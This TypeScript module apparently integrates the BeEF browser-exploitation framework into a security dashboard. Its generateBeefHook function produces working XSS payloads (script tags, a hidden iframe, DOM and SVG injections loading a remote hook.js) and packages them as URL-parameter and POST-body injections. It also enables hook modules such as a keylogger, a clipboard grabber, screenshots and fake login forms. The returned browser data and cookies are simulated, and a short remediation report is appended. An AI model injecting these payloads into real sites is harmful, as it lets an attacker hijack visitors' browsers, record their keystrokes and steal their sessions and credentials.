/**
 * BeEF XSS Framework integration for Security Operation Center
 * Based on the Browser Exploitation Framework (BeEF)
 */

export interface BeefXssOptions {
  target: string;
  hookUrl?: string;
  customHook?: string;
  payloadType?: 'invisible' | 'visible' | 'custom';
  includeJquery?: boolean;
  autorun?: boolean;
  modules?: string[];
}

export interface BeefXssResult {
  target: string;
  hookUrl: string;
  generatedPayload: string;
  injectionMethods: Array<{
    method: string;
    description: string;
    code: string;
  }>;
  commandModules: Array<{
    name: string;
    description: string;
    enabled: boolean;
  }>;
  scanTime: number;
  status: 'success' | 'error';
  sessionId?: string;
  onlineHooks?: number;
  browserInfo?: {
    userAgent?: string;
    browserName?: string;
    browserVersion?: string;
    os?: string;
    plugins?: string[];
    cookies?: Record<string, string>;
  };
  vulnerabilityReport?: {
    severity: 'Low' | 'Medium' | 'High' | 'Critical';
    findings: Array<{
      type: string;
      description: string;
      recommendation: string;
    }>;
  };
}

/**
 * Generate a BeEF hook payload for XSS exploitation
 * @param options BeEF XSS options
 * @returns BeEF XSS results with payload and injection methods
 */
export async function generateBeefHook(options: BeefXssOptions): Promise<BeefXssResult> {
  const startTime = Date.now();
  
  // Default hook URL if not provided
  const hookUrl = options.hookUrl || 'http://localhost:3000/hook.js';
  
  // Generate payload based on the type
  let generatedPayload = '';
  
  switch (options.payloadType) {
    case 'invisible':
      generatedPayload = `<script src="${hookUrl}" type="text/javascript"></script>`;
      break;
    case 'visible':
      generatedPayload = `<div style="display:none"><iframe src="${hookUrl}"></iframe></div>`;
      break;
    case 'custom':
      generatedPayload = options.customHook || `<script src="${hookUrl}" type="text/javascript"></script>`;
      break;
    default:
      // Default to the standard hook
      generatedPayload = `<script src="${hookUrl}" type="text/javascript"></script>`;
  }

  // Include jQuery if requested
  if (options.includeJquery) {
    generatedPayload = `<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>\n${generatedPayload}`;
  }

  // Generate a simulated session ID
  const sessionId = generateRandomSessionId();
  
  // Prepare injection methods
  const injectionMethods = [
    {
      method: 'Direct Script Injection',
      description: 'Add the script tag directly to vulnerable parameter',
      code: generatedPayload
    },
    {
      method: 'URL Parameter',
      description: 'Inject via malicious URL parameter',
      code: `https://example.com/search?q=${encodeURIComponent(generatedPayload)}`
    },
    {
      method: 'POST Data',
      description: 'Inject via form submission',
      code: `Content-Type: application/x-www-form-urlencoded\n\ncomment=${encodeURIComponent(generatedPayload)}`
    },
    {
      method: 'DOM-based Injection',
      description: 'Inject via DOM manipulation',
      code: `
const payload = document.createElement('script');
payload.setAttribute('src', '${hookUrl}');
document.body.appendChild(payload);`
    },
    {
      method: 'SVG-based XSS',
      description: 'Inject using SVG elements',
      code: `<svg><script href="${hookUrl}" /></svg>`
    }
  ];

  // Default command modules
  const defaultModules = [
    { name: 'Chrome Extensions', description: 'Detect installed Chrome extensions', enabled: true },
    { name: 'Clipboard Grabber', description: 'Captures clipboard content when available', enabled: true },
    { name: 'Fingerprinting', description: 'Identifies browser details', enabled: true },
    { name: 'Keylogger', description: 'Records keystrokes', enabled: true },
    { name: 'Port Scanner', description: 'Scans available ports', enabled: false },
    { name: 'Screenshot', description: 'Takes screenshots of the viewport', enabled: true },
    { name: 'Social Engineering', description: 'Presents fake authentication forms', enabled: false },
    { name: 'Network Discovery', description: 'Maps internal network resources', enabled: false },
    { name: 'WebRTC', description: 'Gets internal IP addresses through WebRTC', enabled: true }
  ];

  // Filter modules based on options
  const commandModules = options.modules && options.modules.length > 0
    ? defaultModules.map(module => ({
        ...module,
        enabled: options.modules!.includes(module.name)
      }))
    : defaultModules;

  // Prepare demo browser info
  const browserInfo = {
    userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    browserName: 'Chrome',
    browserVersion: '91.0.4472.124',
    os: 'Windows 10',
    plugins: ['PDF Viewer', 'Chrome PDF Viewer', 'Chromium PDF Viewer', 'Microsoft Edge PDF Viewer', 'WebKit built-in PDF'],
    cookies: {
      'session': '12345abcde',
      'preference': 'darkmode',
      'tracking': 'bbd1e8ab9023ef',
    }
  };

  // Prepare vulnerability report
  const vulnerabilityReport = {
    severity: 'High' as const,
    findings: [
      {
        type: 'Reflected XSS',
        description: 'The application reflects unvalidated input back to the user',
        recommendation: 'Implement proper input validation and output encoding'
      },
      {
        type: 'DOM XSS',
        description: 'JavaScript functions use data from untrusted sources',
        recommendation: 'Sanitize data before using it in DOM manipulation'
      },
      {
        type: 'Missing Security Headers',
        description: 'Content-Security-Policy is not properly configured',
        recommendation: 'Implement strict CSP headers to prevent script execution'
      }
    ]
  };

  // Create the result object
  const result: BeefXssResult = {
    target: options.target,
    hookUrl,
    generatedPayload,
    injectionMethods,
    commandModules,
    scanTime: Date.now() - startTime,
    status: 'success',
    sessionId,
    onlineHooks: 1, // Simulating one active hook
    browserInfo,
    vulnerabilityReport
  };

  return result;
}

/**
 * Generate a random session ID for demonstration purposes
 */
function generateRandomSessionId(): string {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let result = '';
  for (let i = 0; i < 16; i++) {
    result += characters.charAt(Math.floor(Math.random() * characters.length));
  }
  return result;
}